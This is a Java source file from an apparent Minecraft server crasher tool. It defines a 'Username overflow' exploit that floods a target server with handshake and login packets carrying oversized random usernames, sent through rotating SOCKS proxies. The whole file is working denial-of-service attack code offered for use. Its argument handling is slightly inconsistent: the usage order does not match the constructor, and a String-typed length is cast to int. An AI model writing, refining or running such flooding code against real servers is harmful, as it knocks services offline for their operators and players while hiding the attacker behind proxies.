package uwu.narumi.crasher.core.exploit;

import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.util.LinkedList;
import java.util.Objects;
import java.util.Queue;
import uwu.narumi.crasher.api.exception.ExploitException;
import uwu.narumi.crasher.api.exploit.Exploit;
import uwu.narumi.crasher.api.exploit.ExploitInfo;
import uwu.narumi.crasher.api.exploit.argument.Argument;
import uwu.narumi.crasher.api.helper.AddressHelper.McAddress;
import uwu.narumi.crasher.api.helper.PacketHelper;
import uwu.narumi.crasher.api.helper.Protocol;
import uwu.narumi.crasher.api.helper.ProxyHelper;
import uwu.narumi.crasher.api.helper.StringHelper;
import uwu.narumi.crasher.api.io.NetOut;
import uwu.narumi.crasher.api.optimizer.Optimizer;
import uwu.narumi.crasher.api.packet.Packet;

@ExploitInfo(
    name = "Username",
    description = "Username overflow idk xd",
    usage = "exploit username <address> <amount> <unicode: true/false> <nick length>"
)
public class Username extends Exploit {

  private final Queue<Packet[]> packets = new LinkedList<>();

  public Username() {
    super(
        new Argument("address", 0, McAddress.class),
        new Argument("version", 1, String.class),
        new Argument("unicode", 2, Boolean.class),
        new Argument("nick length", 3, String.class),
        new Argument("amount", 4, Integer.class)
    );
  }

  @Override
  public void execute(Object... args) throws ExploitException {
    index.set(0);

    McAddress address = (McAddress) args[0];

    boolean unicode = (boolean) args[2];
    int protocol = Protocol.getByName((String) args[1]).getId();
    int length = (int) args[3];
    int amount = (int) args[4];

    preGenerate(address, protocol, unicode, length, amount);

    Optimizer.startOptimizing(Username.class);
    Optimizer.setStopAction(packets::clear);
    Optimizer.post(() -> {
      try {
        Proxy proxy = ProxyHelper.getSocks();
        Socket socket = ProxyHelper.createSocket(proxy);
        if (socket == null)
          throw new ThreadDeath();

        socket.connect(new InetSocketAddress(address.getIp(), address.getPort()));
        NetOut netOut = new NetOut(socket.getOutputStream());
        for (Packet packet : Objects.requireNonNull(packets.poll())) {
          packet.send(netOut);
        }

        Optimizer.update();
        System.out.println(String.format("%s -> %s | %s/%s", proxy, address.toString(), index.getAndIncrement(), amount));
      } catch (Exception ignored) { }
    }, amount);
  }

  private void preGenerate(McAddress address, int protocol, boolean unicode, int length, int amount) {
    if (length > Short.MAX_VALUE)
      length = Short.MAX_VALUE;

    System.out.println("Pre generating packets");
    for (int i = 0; i < amount; i++) {
      packets.add(new Packet[]{
          PacketHelper.createHandshake(protocol, address.getIp(), (short) address.getPort(), 2),
          PacketHelper.createLoginStart(unicode ? StringHelper.getRandomUTF(length) : StringHelper.getRandomString(length))
      });
    }
    System.out.println("Generated packets");
  }
}